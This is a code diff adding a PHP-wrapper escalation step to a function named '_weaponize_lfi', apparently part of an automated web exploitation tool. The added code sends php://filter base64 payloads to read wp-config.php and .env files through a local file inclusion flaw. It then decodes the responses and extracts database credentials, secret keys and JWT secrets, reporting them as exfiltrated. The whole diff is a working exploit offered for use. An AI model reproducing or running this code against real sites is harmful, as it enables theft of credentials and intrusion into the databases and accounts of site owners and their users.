@@ -330,6 +330,68 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
                        f"DB_PASSWORD={'***' if db_credentials.get('DB_PASSWORD') else 'not found'}, "
                        f"table_prefix={db_credentials.get('table_prefix','wp_')}"),
         }
+
+    # --- PHP wrapper escalation ---
+    # Traversal may be blocked by sanitizers that strip ../ but allow PHP wrappers.
+    _step(step_fn, "trying PHP wrappers for LFI escalation (php://filter, php://input)")
+    _php_wrapper_targets = [
+        (f"php://filter/convert.base64-encode/resource=wp-config.php", "wp-config.php"),
+        (f"php://filter/convert.base64-encode/resource=../../wp-config.php", "wp-config.php"),
+        (f"php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php", "wp-config.php"),
+        (f"php://filter/read=convert.base64-encode/resource=wp-config.php", "wp-config.php"),
+        (f"php://filter/convert.base64-encode/resource=.env", ".env"),
+        (f"php://filter/convert.base64-encode/resource=../../.env", ".env"),
+    ]
+    import base64 as _b64
+    for _wrapper_payload, _target_name in _php_wrapper_targets:
+        _p = {param: _wrapper_payload}
+        _r = _send(boot, method, endpoint,
+                   params=_p if method.upper() == "GET" else None,
+                   data=_p if method.upper() != "GET" else None)
+        if _r is None or _r.status_code != 200:
+            continue
+        _body = _r.text or ""
+        # Look for base64-encoded content (long run of base64 chars)
+        _b64_match = re.search(r'([A-Za-z0-9+/]{60,}={0,2})', _body)
+        if not _b64_match:
+            continue
+        try:
+            _decoded = _b64.b64decode(_b64_match.group(1) + "==").decode("utf-8", errors="replace")
+        except Exception:
+            continue
+        if "DB_NAME" in _decoded or "DB_PASSWORD" in _decoded or "table_prefix" in _decoded:
+            # Extracted wp-config.php via PHP wrapper
+            _php_creds = {}
+            for key in ("DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST", "table_prefix"):
+                _m = re.search(rf"define\s*\(\s*['\"]?{key}['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
+                               _decoded, re.IGNORECASE)
+                if _m:
+                    _php_creds[key] = _m.group(1)
+            _step(step_fn, f"PHP wrapper LFI SUCCESS via {_wrapper_payload[:60]!r}")
+            return {
+                "technique": "lfi_php_wrapper",
+                "data": {
+                    "wrapper_payload": _wrapper_payload,
+                    "db_credentials": _php_creds,
+                    "decoded_snippet": _decoded[:300],
+                },
+                "impact": (f"wp-config.php exfiltrated via PHP wrapper: "
+                           f"DB_USER={_php_creds.get('DB_USER','?')}, "
+                           f"table_prefix={_php_creds.get('table_prefix','wp_')}"),
+                "file_read_success": True,
+            }
+        elif "DATABASE_URL" in _decoded or "SECRET_KEY" in _decoded or "JWT_SECRET" in _decoded:
+            _step(step_fn, f"PHP wrapper LFI SUCCESS (.env) via {_wrapper_payload[:60]!r}")
+            return {
+                "technique": "lfi_php_wrapper",
+                "data": {
+                    "wrapper_payload": _wrapper_payload,
+                    "decoded_snippet": _decoded[:300],
+                },
+                "impact": "Sensitive config file (.env) read via PHP wrapper — credentials present",
+                "file_read_success": True,
+            }
+
     # --- Generic config file fallback (non-WP targets) ---
     _step(step_fn, "wp-config.php not found — trying generic app config files")
     _GENERIC_CONFIGS = [
